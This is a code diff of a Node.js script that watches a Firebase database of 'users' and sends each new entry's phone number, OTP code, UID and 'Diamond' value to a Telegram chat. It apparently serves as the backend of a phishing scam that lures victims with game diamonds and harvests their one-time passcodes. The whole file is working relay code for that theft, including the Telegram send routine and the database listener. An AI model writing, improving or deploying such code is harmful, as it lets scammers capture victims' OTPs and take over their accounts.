@@ -2,40 +2,67 @@ import admin from "firebase-admin";
 import fetch from "node-fetch";
 import fs from "fs";
 
-// Load serviceAccountKey from environment secret
-const serviceAccount = JSON.parse(process.env.SERVICE_ACCOUNT_JSON);
+// =====================
+// Load Firebase Service Account from Render Secret
+// =====================
+const serviceAccount = JSON.parse(
+  fs.readFileSync("/etc/secrets/serviceAccountKey.json", "utf8")
+);
 
+// Initialize Firebase
 admin.initializeApp({
   credential: admin.credential.cert(serviceAccount),
-  databaseURL: process.env.FIREBASE_DB_URL
+  databaseURL: "https://siyamhasansiyam-2c149-default-rtdb.firebaseio.com"
 });
 
 const db = admin.database();
 
-// Telegram info
-const BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN;
-const CHAT_ID = process.env.TELEGRAM_CHAT_ID;
+// =====================
+// Telegram Bot Config
+// =====================
+const TELEGRAM_BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN; // Set this in Render Environment Variables
+const TELEGRAM_CHAT_ID = process.env.TELEGRAM_CHAT_ID;     // Set this in Render Environment Variables
 
-// Firebase listener
-db.ref("users").on("child_changed", async (snapshot) => {
-  const userKey = snapshot.key;
+if (!TELEGRAM_BOT_TOKEN || !TELEGRAM_CHAT_ID) {
+  console.error("❌ Telegram Bot Token or Chat ID not set in Environment Variables!");
+  process.exit(1);
+}
+
+// =====================
+// Helper function to send message to Telegram
+// =====================
+async function sendTelegramMessage(message) {
+  const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
+  try {
+    await fetch(url, {
+      method: "POST",
+      headers: { "Content-Type": "application/json" },
+      body: JSON.stringify({
+        chat_id: TELEGRAM_CHAT_ID,
+        text: message
+      })
+    });
+  } catch (err) {
+    console.error("Telegram send error:", err);
+  }
+}
+
+// =====================
+// Listen to Firebase Realtime Database
+// =====================
+const usersRef = db.ref("users");
+
+usersRef.on("child_added", async (snapshot) => {
   const userData = snapshot.val();
 
-  let message = `Update from user: ${userKey}\n`;
+  let message = `📥 New Data Added:\n`;
+  if (userData.NUMBERC) message += `Number: ${userData.NUMBERC}\n`;
+  if (userData.OTPC) message += `OTP: ${userData.OTPC}\n`;
+  if (userData.DIAMONDC) message += `Diamond: ${userData.DIAMONDC}\n`;
+  if (userData.UIDC) message += `UID: ${userData.UIDC}\n`;
 
-  if(userData.NUMBERC) message += `Number: ${userData.NUMBERC}\n`;
-  if(userData.OTPC) message += `OTP: ${userData.OTPC}\n`;
-  if(userData.UIDC) message += `UID: ${userData.UIDC}\n`;
-  if(userData.DIAMONDC) message += `Diamond: ${userData.DIAMONDC}\n`;
-
-  await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
-    method: "POST",
-    headers: { "Content-Type": "application/json" },
-    body: JSON.stringify({
-      chat_id: CHAT_ID,
-      text: message
-    })
-  });
+  console.log(message); // For debug
+  await sendTelegramMessage(message);
 });
 
-console.log("Firebase → Telegram bot running...");
+console.log("✅ Firebase → Telegram listener running...");
